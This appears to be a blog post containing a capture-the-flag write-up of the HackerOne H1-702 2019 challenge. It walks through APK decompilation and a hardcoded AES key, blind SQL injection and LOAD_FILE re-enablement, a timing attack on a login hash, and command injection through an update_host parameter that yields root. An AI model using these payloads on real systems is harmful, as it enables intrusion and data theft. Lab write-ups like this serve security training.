<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>H1-702 2019 - CTF Writeup | Alex Chapman’s Blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="H1-702 2019 - CTF Writeup" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a GitHub Gist." />
<meta property="og:description" content="My goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a GitHub Gist." />
<link rel="canonical" href="https://blog.ajxchapman.com/posts/2019/03/26/h1-702-ctf-2019.html" />
<meta property="og:url" content="https://blog.ajxchapman.com/posts/2019/03/26/h1-702-ctf-2019.html" />
<meta property="og:site_name" content="Alex Chapman’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-03-26T00:00:00-05:00" />
<script type="application/ld+json">
{"headline":"H1-702 2019 - CTF Writeup","dateModified":"2019-03-26T00:00:00-05:00","datePublished":"2019-03-26T00:00:00-05:00","@type":"BlogPosting","description":"My goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a GitHub Gist.","url":"https://blog.ajxchapman.com/posts/2019/03/26/h1-702-ctf-2019.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ajxchapman.com/posts/2019/03/26/h1-702-ctf-2019.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#157878">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
  </head>
  <body>

      <header class="page-header" role="banner">
        <a href="/">
          <h1 class="project-name">Alex Chapman's Blog</h1>
        </a>
        <h2 class="project-tagline">A tech blog about all things Bug Bounty, security and development.
</h2>
        <div class="social">
          <a href="https://twitter.com/ajxchapman" target="_blank"><img src="/assets/icons/twitter.svg"></a>
          <a href="https://infosec.exchange/@ajxchapman" rel="me" target="_blank"><img src="/assets/icons/mastodon.svg"></a>
          <a href="https://github.com/ajxchapman" target="_blank"><img src="/assets/icons/github.svg"></a>
          <a href="https://hackerone.com/ajxchapman" target="_blank"><img src="/assets/icons/hackerone.svg"></a>
          <a href="https://bugcrowd.com/ajxchapman" target="_blank"><img src="/assets/icons/bugcrowd.svg"></a>
        </div>
      </header>

    <main id="content" class="main-content" role="main">
      


  

  
    
    


<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="postheader">
    <a href="/">Home</a>
  </div>
  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">H1-702 2019 - CTF Writeup</h1>
    <p class="post-meta">
      <time datetime="2019-03-26T00:00:00-05:00" itemprop="datePublished">
        2019-03-26
      </time>
      
        • <span itemprop="category"><a href="/categories/bugbounty.html">Bug Bounty</a></span>
      
  </header>
  <div class="post-content" itemprop="articleBody">
    <p>My goal for this CTF was to primarily use tools and scripts that I had personally written to complete it. Throughout this challenge I used and extended my personal toolkit extensively. All the proof of concept tools I have produced as a result of this CTF are available in a <a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97">GitHub Gist</a>.</p>

<!--more-->

<h2 id="stage-1---ctf-announcement-image">Stage 1 - CTF Announcement Image</h2>
<p>The H1-702 50m-CTF was announced on Twitter with two images, an no other details!</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Booyah! 46 million baby! 🔥🔥🔥Let’s celebrate our way to 50 M with the biggest, the baddest, the warmest CTF in HackerOne History! It is so big in fact, the winning report gets $10k 🤑 and the top 5 reports join us in VEGAS for h1-702.  <a href="https://twitter.com/hashtag/CTF?src=hash&amp;ref_src=twsrc%5Etfw">#CTF</a> <a href="https://twitter.com/hashtag/defcon?src=hash&amp;ref_src=twsrc%5Etfw">#defcon</a> <a href="https://twitter.com/hashtag/Bounties?src=hash&amp;ref_src=twsrc%5Etfw">#Bounties</a> <a href="https://twitter.com/hashtag/h1702?src=hash&amp;ref_src=twsrc%5Etfw">#h1702</a> <a href="https://t.co/sRURvPkuiR">pic.twitter.com/sRURvPkuiR</a></p>&mdash; HackerOne (@Hacker0x01) <a href="https://twitter.com/Hacker0x01/status/1100543680383832065?ref_src=twsrc%5Etfw">February 26, 2019</a></blockquote>
<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>The implication being that all the details required were included in the tweet.</p>

<p>Of the two images, the first image included the names of many of the top hackers on HackerOne. The second image included a flag (a not so subtle hint maybe?) with a repeating binary code in the background. Decoding this binary code seemed to be the objective of this first clue.</p>

<p>Being the odd kind of lazy, in that I would prefer to spend hours writing code instead of doing something manually for 20 minutes, I set out to write a script to extract the binary code from the image using character recognition. Initial tests with OCR libraries (tesseract, ocr.space, etc.) did not provide very useful results due to the noise in the image. So I sat down to write a script using the Python Pillow library to do this manually.</p>

<p>The script (<a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py">available here</a>) went through each line in the image, annotated the identified characters and attempted to determine if a given character was a <code class="highlighter-rouge">1</code> or a <code class="highlighter-rouge">0</code> based on the character width (a non-fixed width font was used in the image which helped).</p>

<p>A copy of the annotated image can be seen below:
<img src="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/image_annotated.png" alt="Annotated image" /></p>

<p>The output was somewhat tricky, as the character extraction was not 100% reliable due to image composition and noise, and no single line included the full output. With a little fiddling, however, the full binary code was easily extracted, and the message decoded:</p>
<ul>
  <li>Binary String
    <ul>
      <li><code class="highlighter-rouge">011110100110110001101001011000100010101101111000100111000100101111001010001011001101000101001011110010011101011111001111001100000010110011001001010010000010110111001010000001010000000000100101110100100000010100101001</code></li>
    </ul>
  </li>
  <li>Decoded into bytes
    <ul>
      <li><code class="highlighter-rouge">'zlib+xK,K0,H-\x05\x00%\x05)'</code></li>
    </ul>
  </li>
  <li>Zlib decompressed
    <ul>
      <li><a href="http://bit.do/h1therm">bit.do/h1therm</a></li>
    </ul>
  </li>
  <li>Un-shortened URL
    <ul>
      <li><a href="https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view">https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view</a></li>
    </ul>
  </li>
</ul>

<p>This provided an Android APK file for download and allowed me to start on the next stage.</p>

<h4 id="tools">Tools</h4>
<ul>
  <li><a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-image_extract-py">image_extract.py</a></li>
</ul>

<h3 id="summary-of-issues">Summary of Issues:</h3>
<ul>
  <li>Storing sensitive information in plain sight ;-)</li>
</ul>

<h2 id="stage-2---android-apk">Stage 2 - Android APK</h2>
<p>Without a spare test Android device to hand I downloaded and ran <a href="http://www.android-x86.org/">Android x86</a> in a VirtualBox Virtual Machine. Running the <code class="highlighter-rouge">h1thermostat</code> application downloaded from the previous stage I was greeted with a login screen:</p>

<p><img src="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/android_x86.png" alt="Android x86" /></p>

<p>Analysis of the network traffic from the VM using <a href="https://www.wireshark.org/">Wireshark</a> showed the <code class="highlighter-rouge">h1thermostat</code> application sends unencrypted HTTP requests to a server at <code class="highlighter-rouge">35.243.186.41</code>:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Dalvik/2.1.0 (Linux; U; Android 8.1.0; VirtualBox Build/OPM8.190105.002)</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">35.243.186.41</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">123</span>

d=aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGg%0At%2F803RyZmSHaMd0KzZPTD%2FdgQlUgoNA%3D%0A&amp;
</code></pre></div></div>
<p>Whilst the application did not use TLS to encrypt the entire HTTP session, it appeared that the POST payload was in an encrypted form. In order to decrypt the payload I would have to review the application code.</p>

<p>Breaking out <a href="https://github.com/iBotPeaches/Apktool">apktool</a>, <a href="https://github.com/pxb1988/dex2jar">dex2jar</a> and <a href="https://github.com/java-decompiler/jd-gui">JD-Gui</a> to extract the apk, disassemble the Dalvik executable to Java bytecode and decompile the Java bytecode to readable Java, I was able to get a good view of the application source code.</p>

<p>A review of the decompiled source code identified the encryption / decryption functions in <code class="highlighter-rouge">com.hackerone.thermostat.PayloadRequest</code>:</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">String</span> <span class="nf">buildPayload</span><span class="o">(</span><span class="nc">JSONObject</span> <span class="n">paramJSONObject</span><span class="o">)</span>
    <span class="kd">throws</span> <span class="nc">Exception</span>
  <span class="o">{</span>
    <span class="nc">SecretKeySpec</span> <span class="n">localSecretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span> <span class="o">{</span> <span class="mi">56</span><span class="o">,</span> <span class="mi">79</span><span class="o">,</span> <span class="mi">46</span><span class="o">,</span> <span class="mi">106</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">5</span><span class="o">,</span> <span class="o">-</span><span class="mi">27</span><span class="o">,</span> <span class="mi">34</span><span class="o">,</span> <span class="mi">59</span><span class="o">,</span> <span class="o">-</span><span class="mi">128</span><span class="o">,</span> <span class="o">-</span><span class="mi">23</span><span class="o">,</span> <span class="mi">96</span><span class="o">,</span> <span class="o">-</span><span class="mi">96</span><span class="o">,</span> <span class="o">-</span><span class="mi">90</span><span class="o">,</span> <span class="mi">80</span><span class="o">,</span> <span class="mi">116</span> <span class="o">},</span> <span class="s">"AES"</span><span class="o">);</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrayOfByte</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">16</span><span class="o">];</span>
    <span class="k">new</span> <span class="nf">SecureRandom</span><span class="o">().</span><span class="na">nextBytes</span><span class="o">(</span><span class="n">arrayOfByte</span><span class="o">);</span>
    <span class="nc">Object</span> <span class="n">localObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">IvParameterSpec</span><span class="o">(</span><span class="n">arrayOfByte</span><span class="o">);</span>
    <span class="nc">Cipher</span> <span class="n">localCipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES/CBC/PKCS5Padding"</span><span class="o">);</span>
    <span class="n">localCipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">localSecretKeySpec</span><span class="o">,</span> <span class="o">(</span><span class="nc">AlgorithmParameterSpec</span><span class="o">)</span><span class="n">localObject</span><span class="o">);</span>
    <span class="n">localObject</span> <span class="o">=</span> <span class="n">localCipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramJSONObject</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">paramJSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">localObject</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">16</span><span class="o">];</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">arrayOfByte</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">paramJSONObject</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">);</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">localObject</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">paramJSONObject</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="n">localObject</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
    <span class="k">return</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">paramJSONObject</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>This code snippet shows that the application used AES with Cipher Block Chaining and PKCS5 padding. A static encryption key is used, and a random IV generated which is prepended to the encrypted message before the entire thing is base64 encoded.</p>

<p>Decrypting this with Python gives us:</p>
<pre><code class="language-Python">import base64
from Crypto.Cipher import AES

key = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]
def decrypt(data):
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]
    data = base64.b64decode(data)
    iv = data[:16]
    data = data[16:]
    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)
    return _unpad(cipher.decrypt(data)).decode()

print(decrypt("aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGgt/803RyZmSHaMd0KzZPTD/dgQlUgoNA="))
</code></pre>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"username"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"password"</span><span class="p">,</span><span class="nl">"cmd"</span><span class="p">:</span><span class="s2">"getTemp"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Armed with the ability to encrypt and decrypt payloads I could progress to the next stage!</p>

<h3 id="summary-of-issues-1">Summary of Issues:</h3>
<ul>
  <li>Hardcoded cryptographic key</li>
  <li>No TLS and certificate pinning</li>
</ul>

<h2 id="stage-3---flitethermostat-api">Stage 3 - FliteThermostat API</h2>
<p>Visiting the http://35.243.186.41/ site directly gives the error message “The method is not allowed for the requested URL” showing that I was dealing with a Python Flask application.</p>

<p>The first thing I tried was guessing credentials, so I scripted up my encryption / decryption code with Python Requests and started sending username and password combination to the server. Very quickly I come across a valid combination <code class="highlighter-rouge">admin:password</code>.</p>

<p>Plugging these credentials back into the Android application shows some more, but very limited functionality. I now had the ability to send the <code class="highlighter-rouge">setTemp</code> command (although it should be noted that this doesn’t seem to actually change anything significantly). In order to attempt to increase the application attack surface I set out bruteforcing alternative commands. After a reasonably extensive round of command guessing I came up with only the following commands:</p>
<ul>
  <li>getTemp - Gleaned from initial network traffic analysis</li>
  <li>setTemp - Observed from logging in the the <code class="highlighter-rouge">admin:password</code> credentials</li>
  <li>diag - Guessed command, always responding with “Missing diagnostic parameters” no matter the parameters I supplied</li>
</ul>

<p>Noting that there did not appear to be a large attack surface I reviewed what I already knew, and set about looking for other weaknesses. It was at this point I observed that the <code class="highlighter-rouge">username</code> parameter appeared to be vulnerable to blind SQL injection. The following request payload would happily supply the <code class="highlighter-rouge">getTemp</code> response as if the actual credentials were supplied, confirming the blind SQL injection vulnerability:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admi' + (SELECT 'n') +'"</span><span class="p">,</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"password"</span><span class="p">,</span><span class="w"> </span><span class="nl">"cmd"</span><span class="p">:</span><span class="s2">"getTemp"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Using Blind SQLi techniques outlined in one of my old blog posts (<a href="https://ajxchapman.github.io/security/2017/01/14/blind-sql-injection.html">Blind SQL injection optimization</a>) I scripted up a tool (<a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py">decrypt_sqli.py</a>) to efficiently extract the following information from the database:</p>
<ul>
  <li>User: root@localhost</li>
  <li>Version: 10.1.37_mariadb_0_deb9u1</li>
  <li>Hostname: de8c6c400a9f</li>
  <li>Database: flitebackend</li>
  <li>Tables: Columns
    <ul>
      <li>Devices: ID, IP</li>
      <li>Users: ID, username, password</li>
    </ul>
  </li>
</ul>

<p>In addition to being able to extract data from the database, I noted that stacked queries were permitted, so I could run my own <code class="highlighter-rouge">INSERT</code> and <code class="highlighter-rouge">UPDATE</code> queries on the database. Whilst I did not find this particularly useful, I noticed that this could be abused to re-enable local file access through the <code class="highlighter-rouge">LOAD_FILE</code> function. <code class="highlighter-rouge">LOAD_FILE</code> was initially restricted as the database user had the <code class="highlighter-rouge">File_priv</code> revoked:</p>
<ul>
  <li>Load File:
    <ul>
      <li>sql_mode: NO_AUTO_CREATE_USER_NO_ENGINE_SUBSTITUTION</li>
      <li>local_infile: ON</li>
      <li>secure_file_priv: ‘’</li>
      <li>File_priv: N</li>
    </ul>
  </li>
</ul>

<p>However, as the database user is the root user, and stacked queries were permitted I could re-enable <code class="highlighter-rouge">LOAD_FILE</code> using the following query:</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">GRANT</span> <span class="n">FILE</span> <span class="k">ON</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'root'</span><span class="o">@</span><span class="s1">'localhost'</span><span class="p">;</span> <span class="n">FLUSH</span> <span class="k">PRIVILEGES</span><span class="p">;</span><span class="o">#</span>
</code></pre></div></div>

<p>With <code class="highlighter-rouge">LOAD_FILE</code> re-enabled I was able to extract the source code for the FliteThermostat API application from <code class="highlighter-rouge">/app/main.py</code>, see attachment <a href="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/main_1.py">main_1.py</a>! Although this was quite a fun attack vector, it actually didn’t lead to any further stages of the CTF.</p>

<p>Going back to the database, dumping the contents of the <code class="highlighter-rouge">Devices</code> table shows numerous IP addresses, most from reserved IPv4 ranges. Ignoring the reserved addresses the table included a single publicly routable address which was extracted with the following query using the <a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py">decrypt_sqli.py</a> tool:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 decrypt_sqli.py <span class="nt">--characters</span> <span class="s2">"._1234567890"</span> <span class="s2">"SELECT CONCAT(ID, '_', IP) from devices WHERE IP not LIKE '2__.%' and IP not LIKE '10.%' and IP not LIKE '192.88.%' ORDER BY ID DESC"</span>
</code></pre></div></div>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">CONCAT</span><span class="p">(</span><span class="n">ID</span><span class="p">,</span> <span class="s1">'_'</span><span class="p">,</span> <span class="n">IP</span><span class="p">)</span> <span class="k">from</span> <span class="n">devices</span> <span class="k">WHERE</span> <span class="n">IP</span> <span class="k">not</span> <span class="k">LIKE</span> <span class="s1">'2__.%'</span> <span class="k">and</span> <span class="n">IP</span> <span class="k">not</span> <span class="k">LIKE</span> <span class="s1">'10.%'</span> <span class="k">and</span> <span class="n">IP</span> <span class="k">not</span> <span class="k">LIKE</span> <span class="s1">'192.88.%'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">ID</span> <span class="k">DESC</span>

<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span> <span class="n">CONCAT</span><span class="p">(</span><span class="n">ID</span><span class="p">,</span> <span class="s1">'_'</span><span class="p">,</span> <span class="n">IP</span><span class="p">)</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
<span class="o">|</span> <span class="mi">69</span><span class="n">_104</span><span class="p">.</span><span class="mi">196</span><span class="p">.</span><span class="mi">12</span><span class="p">.</span><span class="mi">98</span>    <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+</span>
</code></pre></div></div>

<p>The extracted address led me to the next stage of the CTF.</p>

<h4 id="tools-1">Tools</h4>
<ul>
  <li><a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-decrypt_sqli-py">decrypt_sqli.py</a></li>
</ul>

<h4 id="attachments">Attachments</h4>
<ul>
  <li><a href="https://blog.ajxchapman.com/assets/h1-702-ctf-2019/main_1.py">main_1.py</a></li>
</ul>

<h3 id="summary-of-issues-2">Summary of Issues</h3>
<ul>
  <li>Guessable Credentials</li>
  <li>Blind SQL Injection</li>
  <li>Insecure database configuration leading to Local File Disclosure</li>
</ul>

<h2 id="stage-4---flitethermostat-backend">Stage 4 - FliteThermostat Backend</h2>
<h3 id="stage-41-login">Stage 4.1 Login</h3>
<p>Visiting the http://104.196.12.98/ application directly showed a login page. Checking a non existing page presented an error message disclosing that once again I was looking at a Python Flask application.</p>

<p>Attempting to log into the application showed that the provided user credentials were hashed in the browser via JavaScript before being sent to the server:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">104.196.12.98</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://104.196.12.98/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">69</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

hash=f6e6530a2b9bad0780df53a03a161f771fecb83a66c184b356330b38bef67dd6
</code></pre></div></div>

<p>Extracting the JavaScript hashing code in order to pre-compute hashes for various username / password combinations and submitting those hashes did not lead to any results. Guessing application paths only identified pages that redirected to the login page (<code class="highlighter-rouge">/control</code>, <code class="highlighter-rouge">/diagnostics</code>, <code class="highlighter-rouge">/main</code>, <code class="highlighter-rouge">/update</code>). Unless the credentials were something obscure, I decided there must be another way to bypass the authentication mechanism.</p>

<p>Playing with the <code class="highlighter-rouge">hash</code> parameter, I observed that requests with a <code class="highlighter-rouge">hash</code> length of 64 characters took &gt; 500ms to respond, where as a <code class="highlighter-rouge">hash</code> length of anything else returned nearly immediately. It looked like the application may been vulnerable to a timing side-channel attack. Sending 256 requests with each possible value for the first byte soon confirmed it, a <code class="highlighter-rouge">hash</code> of length 64 which started with <code class="highlighter-rouge">f9</code> took &gt; 1000ms to respond where as all other values took ~500ms to respond.</p>

<p>Timing side-channel attacks are notoriously difficult to exploit, especially so across the internet. In this case I appeared to be luck, the timing difference was easily measurable, approximately 500ms for each successful byte guessed. Even so, there were a number of techniques I used that made getting results more reliable. First, I ran my tests from a server as physically close to the target server as possible. The target was running on Google cloud in one of Google’s us-east data centers, so I chose to spin up a VPS in a us-east data center to work from. Secondly, I used HTTP pipelining (a technique inspired by Albinowax’s recent <a href="https://www.youtube.com/watch?v=vCpIAsxESFY">talk on Turbo Intruder</a>) to help minimise TCP connection, send and response delays which would otherwise seriously skew the results. The HTTP pipelining technique I used, sent multiple requests in a single pipeline, and only measured the execution time after a first response was received. Using these techniques in a script, I was able to start getting reliable results.</p>

<p>The last problem to overcome was the amount of time it was going to take to guess all 32 bytes of a valid hash. Each successfully guessed byte was adding 500ms to the response time, meaning that guessing all 256 possible characters for the 14th byte would take 30 minutes, and over an hour for the 30th byte. One final shortcut was to stop guessing a byte after a result was received which was within an expected time frame for the next byte. This early exit strategy would theoretically reduce the amount of time required by half, but could possibly introduce inconsistency.</p>

<p>After getting my script as reliable as possible, and leaving it for an overnight run, I had successfully extracted a valid hash value, <code class="highlighter-rouge">f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8</code>, and with this could log into the application.</p>

<h4 id="tools-2">Tools</h4>
<ul>
  <li><a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-timing_attack-py">timing_attack.py</a></li>
</ul>

<h3 id="stage-42-exploitation">Stage 4.2 Exploitation</h3>

<p>Logging into the application once again gave limited functionality. The most interesting being the <code class="highlighter-rouge">/update</code> page which appeared to attempt to update the application from the <code class="highlighter-rouge">http://update.flitethermostat:5000/</code> endpoint, however the update consistently failed with an error “Could not connect”.</p>

<p>Attempting to bruteforce parameters on each of the application pages using the Burpsuite parameter names wordlist (<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt">burp-parameter-names.txt</a>) easily identified the <code class="highlighter-rouge">port</code> parameter on the <code class="highlighter-rouge">/update</code> page.</p>

<p>Changing the <code class="highlighter-rouge">port</code> parameter affected the port the update function attempted to use, e.g. a <code class="highlighter-rouge">port</code> parameter of <code class="highlighter-rouge">888</code> caused the update check to be performed against the <code class="highlighter-rouge">http://update.flitethermostat:888/</code> endpoint. This showed I could have some control over the update endpoint, however the port parameter was limited to integer values only, any non integer value caused a 500 error to occur.</p>

<p>Having found one hidden parameter which could modify the update function, I went looking for one which could let me update the host portion of the update check. Using a larger dictionary of parameters produced no new results, so I concluded if a parameter existed it must be a compound parameter made up of multiple words joined together. I wrote another script to help generate compound wordlists, <a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py">wordlist_generator.py</a>. This script could be used to scrape target URLs to generate an application specific wordlist, and join words from multiple wordlists in various ways and forms (joined with underscores, camelCase, present participle form, etc.). This produced a huge wordlist for me to unleash against the application.</p>

<p>The next problem was how to submit this vast wordlist to the application in a reasonable amount of time. A single threaded, synchronous, python script was far too slow, and whilst tools do exist (Wfuzz for example), I wanted to stick to my initial goal of using my own tooling. Borrowing some code from <a href="https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/">https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/</a> and using the Python aiohttp library I wrote a very fast asynchronous request library to use <a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py">httplib.py</a>. This allowed me to easily submit more than 500 requests a second, the only problem now was not DoSing the server!</p>

<p>After a while the combined scripts identified the <code class="highlighter-rouge">update_host</code> parameter, which modified the host portion of the update function. With this and the <code class="highlighter-rouge">port</code> parameter I had complete control over the update destination. Pointing the <code class="highlighter-rouge">update_host</code> at a VPS I controlled, I expected to receive an HTTP request from the server, however no request was received. I tried IP addresses, encoded IP addresses, the localhost address, nothing seem to modify the result of the update function, the “Could not connect” error was always returned.</p>

<p>Eventually I considered that the vulnerability may not be in the update request, but the parameter itself. Soon after this thought, I identified that the parameter was vulnerable to simple command injection using the <code class="highlighter-rouge">$(&lt;command&gt;)</code> sequence.</p>

<pre><code class="language-HTTP">GET /update?update_host=$(echo+Hello+World)198.211.125.160&amp;port=80 HTTP/1.1
Host: 104.196.12.98
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://104.196.12.98/main
Connection: close
Cookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIJAHQ.604xiUcoHwNGwnR5oPQ7kq2Rmak
Upgrade-Insecure-Requests: 1
</code></pre>

<p>This allowed me to move onto the next stage and attempt to further compromise the server.</p>

<h4 id="tools-3">Tools</h4>
<ul>
  <li><a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-wordlist_generator-py">wordlist_generator.py</a></li>
  <li><a href="https://gist.github.com/ajxchapman/b7baca094e61ff120c44379029646b97#file-httplib-py">httplib.py</a></li>
</ul>

<h3 id="summary-of-issues-3">Summary of Issues:</h3>
<ul>
  <li>Non-constant time credential comparison leading to authentication bypass</li>
  <li>Unlisted query parameters accessible</li>
  <li>Command injection</li>
</ul>

<h2 id="stage-5---system-compromise">Stage 5 - System Compromise</h2>
<p>The first thing I do when getting command injection is to identify the user the command is running as, in this case on a Linux server via the <code class="highlighter-rouge">id</code> command:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>
<p>Well that was easy, no need to go looking for privilege escalation issues in this instance.</p>

